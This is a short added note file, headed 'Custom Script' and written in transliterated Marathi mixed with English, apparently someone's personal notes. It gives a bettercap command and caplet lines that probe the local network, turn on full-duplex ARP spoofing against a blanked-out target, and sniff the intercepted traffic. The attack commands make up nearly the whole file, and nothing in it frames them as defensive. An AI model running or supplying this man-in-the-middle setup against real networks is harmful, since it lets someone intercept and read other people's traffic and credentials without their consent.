@@ -1,0 +1,16 @@
+CUSTOM SCRIPT 
+
+
+TR arp sathi ek file banvaycii tr
+
+tya madhe 
+bettercap -iface wlan0 -caplet /root/spoof.cap
+
+nantr net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.target ////////////
+arp.spoof on
+set net.sniff.local true
+net.sniff
+
+
